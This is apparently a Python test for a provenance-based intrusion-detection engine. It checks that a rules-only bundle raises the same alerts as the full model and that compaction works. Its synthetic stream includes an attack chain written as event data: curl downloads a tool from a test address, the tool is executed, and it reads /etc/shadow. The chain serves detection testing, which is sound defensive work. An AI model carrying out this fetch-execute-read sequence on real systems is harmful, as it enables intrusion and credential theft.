"""(generator copied from test_realtime) Real-time rules: running layers 1-2 on consecutive slices of a window as events arrive (Runtime.rules) and then
scoring the window with those hits must give exactly what scoring the whole window gives; the immediate alerts
are the window's layer-1/2 alerts, known before the window closes.
Synthetic stream, harmless data: a program downloaded from an unknown address and executed, a new program."""
import os
import random
import shutil
import time
import sys
import tempfile

from pdp_engine.data import WindowStore, ingest_day
from pdp_engine.runtime import Runtime
from pdp_engine.schema import EDGE_TYPE_ID, Entity, Event, Registry
from pdp_engine.trainer import TrainConfig, Trainer
from pdp_engine.windows import Window, WindowBuilder

import numpy as np

fails = 0


def check(ok, msg):
    global fails
    print(("PASS " if ok else "FAIL ") + msg)
    fails += 0 if ok else 1


rng = random.Random(11)
MIN = 60 * 10**9
T0 = 1_790_000_000 * 10**9
progs = ["/usr/bin/bash", "/usr/bin/python3", "/usr/sbin/sshd", "/usr/bin/curl"]
files = [f"/etc/conf{i}" for i in range(10)]
seq = [0]


def activity(t0, minutes, tag, special=False):
    out = []

    def ev(ts, a, op, b):
        seq[0] += 1
        out.append(([a, b], Event(ts, a.uuid, op, b.uuid, f"e{seq[0]:010d}")))
    for m in range(minutes):
        for k in range(15):
            ts = t0 + m * MIN + k * 10**9
            exe = rng.choice(progs)
            p = Entity.process(f"p:{tag}:{m}:{k}", exe, f"{exe} {k % 3}")
            ev(ts, Entity.file(f"file:{exe}", exe), "EXECUTE", p)
            f = rng.choice(files)
            ev(ts, Entity.file(f"file:{f}", f), "READ", p)
            if k % 5 == 0:
                ev(ts, p, "CONNECT", Entity.socket("net:10.0.0.5:443", "10.0.0.5", 443))
        if special and m == minutes // 2:   # a download from an unknown public address, then executed
            ts = t0 + m * MIN + 20 * 10**9
            c = Entity.process(f"p:{tag}:dl", "/usr/bin/curl", "curl -o /tmp/tool http://203.0.113.9/tool")
            net = Entity.socket("net:203.0.113.9:80", "203.0.113.9", 80)
            tool = Entity.file("file:/tmp/tool", "/tmp/tool")
            ev(ts, net, "RECVFROM", c)
            ev(ts + 10**9, c, "WRITE", tool)
            r = Entity.process(f"p:{tag}:run", "/tmp/tool", "/tmp/tool")
            ev(ts + 2 * 10**9, tool, "EXECUTE", r)
            ev(ts + 3 * 10**9, Entity.file("file:/etc/shadow", "/etc/shadow"), "READ", r)
    return out


tmp = tempfile.mkdtemp()
store = WindowStore(os.path.join(tmp, "store"))
reg = Registry()
WIN = 5 * MIN
for d, day in enumerate(["2026-01-01", "2026-01-02", "2026-01-03"]):
    items = activity(T0 + d * 90 * MIN, 50, f"d{d}")
    for ents, _ in items:
        for e in ents:
            reg.add(e)
    store.add_day(day, ingest_day(reg, (ev for _, ev in items), None, window_ns=WIN))
store.save_registry(reg)
cfg = TrainConfig(device="cpu", w2v_epochs=2, emb_dim=16, velox_epochs=1, velox_runs=1, orthrus_seeds=(0,), orthrus_epochs=1,
                  orthrus_hid_dim=16, orthrus_out_dim=16, velox_out_dim=16, neighbor_size=5)
bdir = os.path.join(tmp, "bundle")
os.makedirs(bdir)
Trainer(store, ["2026-01-01", "2026-01-02"], "2026-01-03", cfg, bdir).run({"bundle_id": "t", "window_ns": WIN})


import json
live = activity(T0 + 400 * MIN, 30, "live", special=True)
out2 = os.path.join(tmp, "rules")
os.makedirs(out2)
t = time.time()
cfg2 = TrainConfig(device="cpu", layers_only=True, alert_layers=("rules",))
Trainer(store, ["2026-01-01", "2026-01-02"], "2026-01-03", cfg2, out2).run({"bundle_id": "r", "window_ns": WIN})
secs = time.time() - t
size = sum(os.path.getsize(os.path.join(d, f)) for d, _, fs in os.walk(out2) for f in fs)
full = sum(os.path.getsize(os.path.join(d, f)) for d, _, fs in os.walk(bdir) for f in fs)
check(json.load(open(os.path.join(out2, "manifest.json")))["layers_only"] and size < full / 5, f"rules-only bundle: {size} bytes (full model {full}), {secs:.1f} s")


def alerts_of(bundle, alert_layers=None):
    r = store.load_registry()
    rt = Runtime(bundle, r, keep_reset_state=False)
    if alert_layers is not None:
        rt.policy.alert_layers = set(alert_layers)
    b = WindowBuilder(window_ns=WIN, chunk=50)
    out = []
    for ents, ev in live:
        for e in ents:
            r.add(e)
        for w in b.push(r.get(ev.src), r.get(ev.dst), ev.ts_ns, EDGE_TYPE_ID[ev.op], ev.event_uuid):
            x = rt.score(w); out.append(sorted((r[int(n)].uuid, x.layer_of(int(n))) for n in x.alerts))
    for w in b.finish():
        x = rt.score(w); out.append(sorted((r[int(n)].uuid, x.layer_of(int(n))) for n in x.alerts))
    return out, rt


a_full, _ = alerts_of(bdir, ("rules",))
a_rules, rt = alerts_of(out2)
check(a_full == a_rules and any(a_rules), f"same alerts as the full model restricted to rules ({[x for x in a_rules if x]})")
check(rt.x is None and rt.state is None and not rt.velox, "the runtime holds no features, neighbour state or learned models")
keep = rt.compaction_keep(T0 + 500 * MIN, 10 * MIN)
n0 = len(rt.reg); rt.compact(keep)
check(len(rt.reg) < n0, f"compaction works without learned state ({n0} -> {len(rt.reg)})")

shutil.rmtree(tmp, ignore_errors=True)
print("FAILURES:", fails)
sys.exit(1 if fails else 0)
